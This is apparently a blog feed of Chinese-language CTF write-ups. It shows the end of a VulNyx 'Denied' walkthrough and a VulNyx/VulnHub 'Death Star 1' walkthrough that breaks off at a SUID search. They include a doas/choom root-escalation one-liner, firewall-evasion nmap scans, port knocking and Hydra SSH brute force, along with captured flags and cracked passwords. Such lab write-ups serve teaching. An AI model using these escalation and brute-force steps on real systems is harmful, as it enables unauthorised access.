‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ssh akira@192.168.205.217 
akira@192.168.205.217's password: shakira
akira@denied:~$ id
uid=1000(akira) gid=1000(akira) grupos=1000(akira)
```
ÊàêÂäü‰ª• `akira` Áî®Êà∑ÁôªÂΩïÁ≥ªÁªüÔºÅ

### 4. ÊùÉÈôêÊèêÂçá - akira -&gt; root

ÊãøÂà∞ `akira` ÁöÑ shellÔºåÂÖàÁúãÁúãÂÆ∂ÁõÆÂΩïÊúâÂï•ÔºåÈ°∫‰æøÊää `user.txt` ËØª‰∫Ü„ÄÇ

```bash
akira@denied:~$ ls -la
total 28
drwx------ 3 akira akira 4096 may 18 13:03 .
drwxr-xr-x 3 root  root  4096 may 18 11:25 ..
lrwxrwxrwx 1 root  root     9 nov 15  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 akira akira  220 nov 15  2023 .bash_logout
-rw-r--r-- 1 akira akira 3526 nov 15  2023 .bashrc
drwxr-xr-x 3 akira akira 4096 may 18 11:41 .local
-rw-r--r-- 1 akira akira  807 nov 15  2023 .profile
-r-------- 1 akira akira   33 may 18 11:41 user.txt
akira@denied:~$ cat user.txt 
6acfb2803973dacc95152a873ba79255
```
User flagÂà∞ÊâãÔºÅÊé•‰∏ãÊù•ÁúãÁúãËÉΩ‰∏çËÉΩÊèêÊùÉÂà∞ `root`„ÄÇ
ÂÖàËØïËØï `sudo -l`Ôºö
```bash
akira@denied:~$ sudo -l
-bash: sudo: orden no encontrada
```
‚Äúorden no encontrada‚ÄùÔºåË•øÁè≠ÁâôËØ≠ÁöÑ ‚Äúcommand not found‚Äù„ÄÇÁúãÊù•Á≥ªÁªüÈáåÊ≤°Êúâ `sudo`ÔºåÊàñËÄÖ `akira` Áî®Êà∑ÁöÑ `PATH` Ê≤°ÈÖçÂ•Ω„ÄÇ

ÈÇ£Â∞±ÊâæÊâæÊúâÊ≤°Êúâ SUID Á®ãÂ∫èÂèØ‰ª•Âà©Áî®„ÄÇ
```bash
akira@denied:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/mount
/usr/bin/chsh
/usr/bin/doas  # &lt;--- Ëøô‰∏™ÁúãËµ∑Êù•‰∏ç‰∏ÄËà¨ÔºÅ
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```
ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ `/usr/bin/doas`ÔºåËøôÁé©ÊÑèÂÑøÊòØ `sudo` ÁöÑ‰∏Ä‰∏™ËΩªÈáèÁ∫ßÊõø‰ª£ÂìÅ„ÄÇÊúâÊàèÔºÅ
ÁúãÁúã `doas` ËÉΩ‰∏çËÉΩÁõ¥Êé•Áî®Ôºö
```bash
akira@denied:/opt$ /usr/bin/doas -h
/usr/bin/doas: invalid option -- 'h'
usage: doas [-Lns] [-C config] [-u user] command [args]
akira@denied:/opt$ /usr/bin/doas -u root bash
doas: Operation not permitted
```
Áõ¥Êé•Áî® `doas -u root bash` ÊèêÁ§∫ ‚ÄúOperation not permitted‚Äù„ÄÇÁúãÊù• `akira` Áî®Êà∑‰∏çËÉΩÈöè‰æøÁî® `doas` ÊâßË°åÊâÄÊúâÂëΩ‰ª§„ÄÇ
ÈÇ£ÂÆÉÂà∞Â∫ïËÉΩÁî® `doas` ÊâßË°åÂï•Âë¢ÔºüÂæóÊÉ≥ÂäûÊ≥ïÊûö‰∏æ‰∏Ä‰∏ã `/etc/doas.conf`ÊàñËÄÖÊö¥ÂäõÊµãËØï `/usr/bin` ‰∏ãÁöÑÂëΩ‰ª§„ÄÇÁªìÊûúÂèëÁé∞`/etc/doas.conf`‰∏çÁªôÁúãÔºåÈÇ£Â∞±Âè™ÂèØ‰ª•Êö¥ÂäõÊµãËØï
Ê†πÊçÆÊó•ÂøóÔºåÊòØÈÄöËøáÈÅçÂéÜÊµãËØïÂèëÁé∞ `/usr/bin/choom` ÂèØ‰ª•Áî® `doas` ÊâßË°åÔºö

```bash
akira@denied:/opt$ for i in $(ls /usr/bin); do doas -u root /usr/bin/$i 2&gt;&amp;1 | grep -v 'doas: Operation not permitted';done
choom: no se ha especificado ni PID ni ORDEN
Escriba 'choom --help' para obtener m√°s informaci√≥n.
akira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom --help

Modo de empleo:
 choom [opciones] -p pid
 choom [opciones] -n n√∫mero -p pid
 choom [opciones] -n n√∫mero [--] orden [args...]]  # &lt;--- ÂÖ≥ÈîÆÂú®ËøôÔºÅ

Muestra y ajusta la puntuaci√≥n de matador OOM.

Opciones:
 -n, --adjust &lt;num&gt;     especifica el valor de ajuste de puntuaci√≥n
 -p, --pid &lt;num&gt;        ID de proceso

 -h, --help             muestra esta ayuda
 -V, --version          muestra la versi√≥n
```
`choom` ÁöÑÂ∏ÆÂä©‰ø°ÊÅØÈáåÂÜôÁùÄÂèØ‰ª•Áî® `-n &lt;n√∫mero&gt; [--] orden [args...]` ÁöÑÊñπÂºèÊù•ÊâßË°å‰∏Ä‰∏™ÂëΩ‰ª§ÔºÅÊó¢ÁÑ∂ `doas` ÂÖÅËÆ∏ `akira` ‰ª• `root` ÊùÉÈôêÊâßË°å `choom`ÔºåÈÇ£Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøá `choom` Êù•Èó¥Êé•‰ª• `root` ÊùÉÈôêÊâßË°å‰ªªÊÑèÂëΩ‰ª§‰∫ÜÔºÅ

Âà©Áî®Ëøô‰∏™ÁâπÊÄßÔºåËÆ© `choom` ÊâßË°å `/bin/bash -p` (`-p` ÂèÇÊï∞ÊòØ‰∏∫‰∫ÜËÆ© bash ‰øùÊåÅÊúâÊïàÁî®Êà∑ID‰∏∫ root)„ÄÇ
```bash
akira@denied:/opt$ /usr/bin/doas -u root /usr/bin/choom -n -1000-p 0 bash
root@denied:/opt# id
uid=0(root) gid=0(root) grupos=0(root)
```
Boom! `uid=0(root)`ÔºåÊàêÂäüÊãøÂà∞ root ÊùÉÈôêÔºÅ

### 5. Êî∂Ëé∑ Root Flag

ÊãøÂà∞ root shellÔºåÊúÄÂêé‰∏ÄÊ≠•ÂΩìÁÑ∂ÊòØËØªÂèñ `/root/root.txt`„ÄÇ
```bash
root@denied:/opt# cat /root/root.txt 
ea2118e462426513a247964eb8320c27
```
Root flagÂà∞ÊâãÔºÅDenied Èù∂Êú∫ÔºåÂçíÔºÅ
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/vulnyx_Denied.html</guid><pubDate>Fri, 27 Jun 2025 09:29:22 +0000</pubDate></item><item><title>VulnHub Death Star- 1 Ê∏óÈÄèÊµãËØïÊä•Âëä</title><link>https://7r1UMPHK.github.io/post/VulnHub%20Death%20Star-%201%20-shen-tou-ce-shi-bao-gao.html</link><description>Èù∂Êú∫Âú∞ÂùÄ: [https://www.vulnhub.com/entry/death-star-1,477/](https://www.vulnhub.com/entry/death-star-1,477/)

![image-20250515144334733](https://7r1umphk.github.io/image/20250515144342235.webp)

### 1. ‰∏ªÊú∫ÂèëÁé∞‰∏éÁ´ØÂè£Êâ´Êèè

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` ÂèëÁé∞Èù∂Êú∫ IP Âú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/bj]
‚îî‚îÄ$ sudo arp-scan -l     
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.210 08:00:27:b2:99:5a       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:ee:d6:af       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.977 seconds (129.49 hosts/sec). 4 responded
```

Èù∂Êú∫ IP ‰∏∫ `192.168.205.210`„ÄÇ

Â∞ùËØïËøõË°åÂÖ®Á´ØÂè£Âø´ÈÄüÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/bj]
‚îî‚îÄ$ nmap -p- --min-rate 10000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:32 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00051s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
```

Ê≤°ÊúâÊâ´ÊèèÂà∞ÂºÄÊîæÁ´ØÂè£ÔºåÊâÄÊúâÁ´ØÂè£Áä∂ÊÄÅ‰∏∫ `ignored` Êàñ `filtered`„ÄÇ
Á°ÆËÆ§‰∏ªÊú∫ÊòØÂê¶ËøûÈÄöÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/bj]
‚îî‚îÄ$ ping 192.168.205.210
PING 192.168.205.210 (192.168.205.210) 56(84) bytes of data.
64 bytes from 192.168.205.210: icmp_seq=1 ttl=64 time=0.475 ms
...
--- 192.168.205.210 ping statistics ---
11 packets transmitted, 11 received, 0% packet loss, time 10231ms
rtt min/avg/max/mdev = 0.285/0.325/0.475/0.050 ms
```

‰∏ªÊú∫ÊòØËøûÈÄöÁöÑ„ÄÇËøôË°®ÊòéÂèØËÉΩÊúâÈò≤ÁÅ´Â¢ôËøáÊª§‰∫Ü TCP Á´ØÂè£Êâ´Êèè„ÄÇ

Â∞ùËØï‰ΩøÁî® `-Pn` (Ë∑≥Ëøá‰∏ªÊú∫ÂèëÁé∞) ÂíåÂÖ∂‰ªñÊâ´ÊèèÊäÄÊúØÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/bj]
‚îî‚îÄ$ sudo nmap -Pn -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:44 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 131.46 seconds
```

Â∞ùËØï ACK Êâ´Êèè (`-sA`) Êù•Êé¢ÊµãÈò≤ÁÅ´Â¢ôËßÑÂàôÈõÜÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/bj]
‚îî‚îÄ$ sudo nmap -Pn -sA -p- --min-rate 1000 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:47 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00038s latency).
All 65535 scanned ports on 192.168.205.210 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 131.40 seconds
```

ÁªìÊûú‰æùÊóß„ÄÇÂ∞ùËØï FIN, Xmas, Null ÈöêËîΩÊâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo nmap -Pn -sF -p- --min-rate 1000 192.168.205.210 &amp;&amp; \
sudo nmap -Pn -sX -p- --min-rate 1000 192.168.205.210 &amp;&amp; \
sudo nmap -Pn -sN -p- --min-rate 1000 192.168.205.210
# ... (‰∏âÊ¨°Êâ´ÊèèÁªìÊûúÁ±ª‰ººÔºåÂùá‰∏∫ open|filtered Êàñ filtered)
```

TCP Á´ØÂè£Êâ´Êèè‰ºº‰πéÈÉΩÊó†Ê≥ïÁ©øÈÄèÈò≤ÁÅ´Â¢ô„ÄÇÂ∞ùËØï UDP Êâ´ÊèèÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/bj]
‚îî‚îÄ$ nmap -sU --top-ports 100 192.168.205.210                                                                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 02:40 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00035s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 103.11 seconds
```

UDP Á´ØÂè£ 68 (DHCPÂÆ¢Êà∑Á´Ø) ÈÄöÂ∏∏‰∏çÊòØÂèØÂà©Áî®ÁöÑÂÖ•Âè£„ÄÇ

Â∞ùËØïÂàÜÁâáÊâ´Êèè (`-f`) ÂíåÊ∫êÁ´ØÂè£‰º™Ë£Ö (`-g 53`)Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo nmap -Pn -sS -f -p- --min-rate 1000 192.168.205.210
# ... (ÁªìÊûú filtered)
                                                                      
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo nmap -Pn -sS -g 53 -p- --min-rate 1000 192.168.205.210
# ... (ÁªìÊûú filtered)
```

ÊâÄÊúâ TCP Êâ´ÊèèÂ∞ùËØïÂùáÂ§±Ë¥•ÔºåÁúãÊù•ÈúÄË¶ÅÂè¶ËæüËπäÂæÑ„ÄÇ

### 2. ÊµÅÈáèÊçïËé∑‰∏é‰ø°ÊÅØËé∑Âèñ

Êó¢ÁÑ∂‰∏ªÂä®Êâ´ÊèèÊïàÊûú‰∏ç‰Ω≥ÔºåÂ∞ùËØïÊçïËé∑Èù∂Êú∫ÂèëÂá∫ÁöÑÊµÅÈáèÔºåÁúãÊòØÂê¶ÊúâÁ∫øÁ¥¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo tcpdump -i eth0 host 192.168.205.210 -nn                                    
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
03:12:01.447736 IP 192.168.205.210.44226 &gt; 255.255.255.255.160: UDP, length 472
03:12:01.447804 IP 192.168.205.210.44226 &gt; 255.255.255.255.160: UDP, length 472
03:12:01.448295 IP 192.168.205.210.53472 &gt; 255.255.255.255.357: UDP, length 97
03:12:01.448342 IP 192.168.205.210.53472 &gt; 255.255.255.255.357: UDP, length 97
03:12:20.192762 IP 192.168.205.210.68 &gt; 192.168.205.254.67: BOOTP/DHCP, Request from 08:00:27:b2:99:5a, length 300
03:12:20.192956 IP 192.168.205.254.67 &gt; 192.168.205.210.68: BOOTP/DHCP, Reply, length 300
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```

ÂèëÁé∞Èù∂Êú∫ÂêëÂπøÊí≠Âú∞ÂùÄÁöÑ UDP Á´ØÂè£ 160 Âíå 357 ÂèëÈÄÅÊï∞ÊçÆ„ÄÇ‰ΩøÁî® `nc` ÁõëÂê¨Ëøô‰∏§‰∏™Á´ØÂè£Ôºö

ÁõëÂê¨ UDP 160 Á´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo nc -ulnp 160 -vv
listening on [any] 160 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 44380

Thanks to the successful Operation Skyhook, the Rebel Alliance
got some plans for the new weapon of the Galactic Empire. We
know that there is a small opening that we can explore through a
thermal exhaust that is directly connected to the Main Reactor of the
Death Star. The superlaser takes 1440 minutes to reload.
It is very important to observe 'this window' in order to recover the blueprint.
This is because, it is only possible to make an attempt every 60 seconds.
^C sent 0, rcvd 472

# ÁøªËØë
ÂæóÁõä‰∫é‚ÄúÂ§©Èí©Ë°åÂä®‚ÄùÁöÑÊàêÂäüÔºå‰πâÂÜõÂêåÁõü
Ëé∑Âæó‰∫Ü‰∏Ä‰∫õÈì∂Ê≤≥Â∏ùÂõΩÊñ∞Ê≠¶Âô®ÁöÑÂõæÁ∫∏„ÄÇÊàë‰ª¨
Áü•ÈÅìÊúâ‰∏Ä‰∏™Â∞èÂºÄÂè£ÔºåÂèØ‰ª•ÈÄöËøá‰∏Ä‰∏™ÁÉ≠ÊéíÊ∞îÂè£ËøõË°åÊé¢Á¥¢ÔºåËøô‰∏™ÊéíÊ∞îÂè£Áõ¥Êé•ËøûÊé•Âà∞Ê≠ªÊòüÁöÑ‰∏ªÂèçÂ∫îÂ†Ü„ÄÇË∂ÖÁ∫ßÊøÄÂÖâÂô®ÈúÄË¶Å1440ÂàÜÈíüÊâçËÉΩÈáçÊñ∞Ë£ÖÂ°´„ÄÇ
‰∏∫‰∫ÜËé∑ÂèñËìùÂõæÔºåËßÇÂØü‚ÄúËøô‰∏™Á™óÂè£‚ÄùËá≥ÂÖ≥ÈáçË¶Å„ÄÇ
ËøôÊòØÂõ†‰∏∫ÔºåÊØè60ÁßíÂè™ËÉΩÂ∞ùËØï‰∏ÄÊ¨°„ÄÇ
```

ÁõëÂê¨ UDP 357 Á´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo nc -ulnp 357 -vv
[sudo] password for kali: 
listening on [any] 357 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.210] 45629


Code to access the Death Star Blueprint
within the time it takes to reload is:  DS-1@OBS     

^C sent 0, rcvd 97
                   
# ÁøªËØë
Âú®ÈáçÊñ∞Âä†ËΩΩÊâÄÈúÄÁöÑÊó∂Èó¥ÂÜÖËÆøÈóÆÊ≠ªÊòüËìùÂõæÁöÑ‰ª£Á†ÅÊòØÔºöDS-1@OBS
```

‰ªé UDP 160 Á´ØÂè£ÁöÑ‰ø°ÊÅØ‰∏≠ÊèêÂèñÂà∞Êï∞Â≠ó `1440` Âíå `60`„ÄÇ‰ªé UDP 357 Á´ØÂè£ÁöÑ‰ø°ÊÅØ‰∏≠Ëé∑ÂèñÂà∞ËÆøÈóÆ‰ª£Á†Å `DS-1@OBS`„ÄÇ
ÊèêÁ§∫Ë¶ÅËßÇÂØü‰∏Ä‰∏™ 'Á™óÂè£'ÔºåÁªìÂêàÊï∞Â≠óÔºåÁåúÊµãËøôÂèØËÉΩÊòØÁ´ØÂè£Âè∑„ÄÇ

Â∞ùËØïÊâ´ÊèèËøô‰∫õÊï∞Â≠óÂØπÂ∫îÁöÑ UDP Á´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -sU -p1440,24,60 192.168.205.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 03:39 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00041s latency).

PORT     STATE  SERVICE
24/udp   closed priv-mail
60/udp   closed unknown
1440/udp open   eicon-slp
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

UDP 1440 Á´ØÂè£ÂºÄÊîæ„ÄÇ

### 3. Ëé∑ÂèñÂõæÁâá‰∏é‰ø°ÊÅØÊèêÂèñ

Âêë UDP 1440 Á´ØÂè£ÂèëÈÄÅ‰πãÂâçËé∑ÂèñÁöÑ‰ª£Á†Å `DS-1@OBS`Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ echo 'DS-1@OBS' | sudo nc -u 192.168.205.210 1440 &gt; 1440.txt
```

Êü•ÁúãÊé•Êî∂Âà∞ÁöÑÂÜÖÂÆπÔºåÂèëÁé∞ÊòØ Base64 ÁºñÁ†ÅÁöÑÊï∞ÊçÆÔºåÂºÄÂ§¥‰∏∫ `/9j/4AAQSkZJRg`ÔºåËøôÊòØ JPEG Êñá‰ª∂ÁöÑÂÖ∏ÂûãÁâπÂæÅ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat 1440.txt | base64 -d &gt; 1440.jpg
```

(Ê≥®: ÂÆûÈôÖÊìç‰Ωú‰∏≠Â∫îÁ°Æ‰øùÊï∞ÊçÆÂÆåÊï¥Êé•Êî∂ÔºåËã•ÂõæÁâá‰∏çÂÆåÊï¥ÂèØËÉΩÂØºËá¥ÂêéÁª≠Ê≠•È™§Â§±Ë¥•„ÄÇÂèØ‰ª•‰ΩøÁî® `nc -u -w1` ËÆæÁΩÆË∂ÖÊó∂„ÄÇ)

ÊâìÂºÄÂõæÁâá `1440.jpg`Ôºö
![image-20250515154643417](https://7r1umphk.github.io/image/20250515154722764.webp)
ÂõæÁâá‰∏äÊòæÁ§∫Ëß£ÈîÅ‰ª£Á†ÅÔºö**197719801983**„ÄÇ

Â∞ùËØïÂØπÂõæÁâáËøõË°åÈöêÂÜôÂàÜÊûê„ÄÇ`strings` Âíå `binwalk` Êú™ÂèëÁé∞ÊòéÊòæÁ∫øÁ¥¢„ÄÇ‰ΩøÁî® `steghide`Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ steghide extract -sf 1440.jpg
Enter passphrase: DS-1@OBS
wrote extracted data to 'openTheExhaust.txt'.
                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat openTheExhaust.txt       
Each segment of the 'unlock code' can only contain 3 characters sent in sequence to unlock port 10110.
                   
# ÁøªËØë
‚ÄúËß£ÈîÅÁ†Å‚ÄùÊØèÊÆµÂè™ËÉΩÂåÖÂê´3‰∏™Â≠óÁ¨¶ÔºåÊåâÈ°∫Â∫èÂèëÈÄÅÂç≥ÂèØËß£ÈîÅ10110Á´ØÂè£„ÄÇ
```

‰ΩøÁî®‰πãÂâçËé∑ÂèñÁöÑ `DS-1@OBS` ‰Ωú‰∏∫ÂØÜÁ†ÅÔºåÊàêÂäüÊèêÂèñÂá∫ `openTheExhaust.txt` Êñá‰ª∂„ÄÇÂÜÖÂÆπÊèêÁ§∫Ëß£ÈîÅ‰ª£Á†ÅÊØèÊÆµ3‰∏™Â≠óÁ¨¶ÔºåÁî®‰∫éËß£ÈîÅ 10110 Á´ØÂè£„ÄÇ

### 4. Á´ØÂè£Êï≤Èó®‰∏é SSH ÁôªÂΩï

Ê†πÊçÆÊèêÁ§∫ÔºåÂ∞ÜËß£ÈîÅ‰ª£Á†Å `197719801983` ÂàÜÂâ≤Êàê `197`, `719`, `801`, `983`ÔºåÂπ∂ËøõË°åÁ´ØÂè£Êï≤Èó®Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ knock 192.168.205.210 197 719 801 983
```

Êï≤Èó®ÂêéÔºåÊâ´ÊèèÁõÆÊ†áÁ´ØÂè£ 10110Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p10110 -sT -sU 192.168.205.210 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:31 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00035s latency).

PORT      STATE  SERVICE
10110/tcp open   nmea-0183
10110/udp closed nmea-0183
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

TCP 10110 Á´ØÂè£Â∑≤ÂºÄÊîæ„ÄÇÊé¢ÊµãÊúçÂä°ÁâàÊú¨Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ nmap -p10110 -sV 192.168.205.210    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 04:32 EDT
Nmap scan report for 192.168.205.210
Host is up (0.00033s latency).

PORT      STATE SERVICE VERSION
10110/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
MAC Address: 08:00:27:B2:99:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

Á´ØÂè£ 10110 ËøêË°åÁöÑÊòØ OpenSSH 6.6.1p1„ÄÇÂ∞ùËØï SSH ÁôªÂΩïÔºåÊ≠§Êó∂Êàë‰ª¨Ê≤°Êúâ‰ªª‰ΩïÂá≠ÊçÆÔºåÂÖàÁî® root ËØïËØïÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ssh root@192.168.205.210 -p 10110
The authenticity of host '[192.168.205.210]:10110 ([192.168.205.210]:10110)' can't be established.
ECDSA key fingerprint is SHA256:oXn/1IjNjNv4INght0MV2FrWXVvTB4QNM9Bx1aRRLos.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.205.210]:10110' (ECDSA) to the list of known hosts.

# ... ASCII Art ...
                                                                          
Devoloped by Galen Walton Erso
System's user: erso
Pass Hint: My wife's first name plus the year (BBY) she died.

Glory to the Empire - Project DS-1: Orbital Battle Station


root@192.168.205.210's password: 
```

SSH ÁôªÂΩïÊèêÁ§∫Ôºö

*   Áî®Êà∑Âêç: `erso`
*   ÂØÜÁ†ÅÊèêÁ§∫: 'ÊàëÂ¶ªÂ≠êÁöÑÂêçÂ≠óÂä†‰∏äÂ•πÂéª‰∏ñÁöÑÂπ¥‰ªΩ (BBY)„ÄÇ' (My wife's first name plus the year (BBY) she died.)

Ê†πÊçÆÊòüÁêÉÂ§ßÊàòËÉåÊôØÔºåGalen Erso ÁöÑÂ¶ªÂ≠êÊòØ Lyra Erso„ÄÇ
![image-20250515163544826](https://7r1umphk.github.io/image/20250515163545042.webp)

Â•πÂéª‰∏ñÁöÑÂπ¥‰ªΩÊòØ 13 BBY (Before Battle of Yavin)„ÄÇ
![image-20250515163625883](https://7r1umphk.github.io/image/20250515163626074.webp)

ÊûÑÈÄ†ÂèØËÉΩÁöÑÂØÜÁ†ÅÂàóË°®Ôºö

```
Lyra13
lyra13
LyraErso13
lyraerso13
Lyraerso13
lyraErso13
Lyra13BBY
lyra13BBY
Lyra13bby
lyra13bby
Lyra-13
lyra-13
Lyra_13
lyra_13
Lyra
lyra
Erso
```

‰ΩøÁî® Hydra ËøõË°åÁàÜÁ†¥Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ hydra -l erso -P pass ssh://192.168.205.210 -s 10110 -I -u -f -e nsr -t 64    
\Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 04:46:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 20 login tries (l:1/p:20), ~1 try per task
[DATA] attacking ssh://192.168.205.210:10110/
[10110][ssh] host: 192.168.205.210   login: erso   password: lyra13
[STATUS] attack finished for 192.168.205.210 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 04:46:22
```

ÊàêÂäüÁàÜÁ†¥Âá∫ÂØÜÁ†Å‰∏∫ `lyra13`„ÄÇ
ÁôªÂΩï SSHÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ssh erso@192.168.205.210 -p 10110
# ... (Login banner) ...
erso@deathStar1:~$ id
uid=1000(erso) gid=1000(erso) groups=1000(erso)
```

ÊàêÂäüÁôªÂΩïÁî®Êà∑ `erso`„ÄÇ

### 5. ÊèêÊùÉ

Êü•Áúã `sudo` ÊùÉÈôêÂíåÂÆ∂ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂Ôºö

```bash
erso@deathStar1:~$ sudo -l
sudo: unable to resolve host deathStar1
[sudo] password for erso: 
Sorry, user erso may not run sudo on deathStar1.
erso@deathStar1:~$ ls -al
total 28
drwxr-xr-x 3 erso erso 4096 May  3  2020 .
drwxr-xr-x 3 root root 4096 May  3  2020 ..
lrwxrwxrwx 1 root root    9 May  3  2020 .bash_history -&gt; /dev/null
-rw-r--r-- 1 erso erso  220 May  3  2020 .bash_logout
-rw-r--r-- 1 erso erso 3631 May  3  2020 .bashrc
drwx------ 2 erso erso 4096 May  3  2020 .cache
-rw-r--r-- 1 erso erso  690 May  3  2020 .profile
-rw------- 1 erso erso  369 May  3  2020 warning.txt
erso@deathStar1:~$ cat warning.txt 
Message from GALEN ERSO:
This is your chance. Destroy the plans of the Galactic Empire. I know that Lord Vader will not like this at all. But, this will be my chance for redemption. I hope you have enough knowledge to help destroy this new weapon.
Explore the system and get 'root access' to read the secret message located at '/root/message.txt'. 
Hack or fail!!
```

ÊèêÁ§∫ root flag Âú® `/root/message.txt`„ÄÇ

Êü•Êâæ SUID Êñá‰ª∂Ôºö

```bash
